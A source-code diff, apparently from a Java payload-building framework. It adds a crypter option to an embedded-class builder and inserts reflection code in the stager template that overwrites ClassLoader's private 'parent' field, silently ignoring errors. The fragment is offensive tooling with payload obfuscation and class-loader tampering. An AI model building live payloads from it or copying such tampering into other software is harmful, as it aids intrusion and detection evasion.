@@ -34,6 +34,7 @@
 
 package javapayload.builder;
 
+import java.lang.reflect.Field;
 import java.util.StringTokenizer;
 
 import javapayload.stager.Stager;
@@ -57,7 +58,7 @@ public class EmbeddedClassBuilder extends Builder {
 	}
 	
 	public String getParameterSyntax() {
-		return "<classname> <stager> [stageroptions] -- <stage> [stageoptions]";
+		return "<classname>[^<crypter>] <stager> [stageroptions] -- <stage> [stageoptions]";
 	}
 	public void build(String[] args) throws Exception {
 		ClassBuilder.buildClass(args[0], args[1], EmbeddedClassBuilderTemplate.class, buildEmbeddedArgs(args), args);
@@ -77,6 +78,11 @@ public class EmbeddedClassBuilder extends Builder {
 	public static class EmbeddedClassBuilderTemplate extends Stager {
 		public static void mainToEmbed(String[] args) throws Exception {
 			EmbeddedClassBuilderTemplate cb = new EmbeddedClassBuilderTemplate();
+			try {
+				Field f = Class.forName("java.lang.ClassLoader").getDeclaredField("parent");
+				f.setAccessible(true);
+				f.set(cb, cb.getClass().getClassLoader());
+			} catch (Throwable t) {}
 			boolean needWait = false;
 			if (args.length == 1 && args[0].equals("+")) {
 				args[0] = args[0].substring(1);
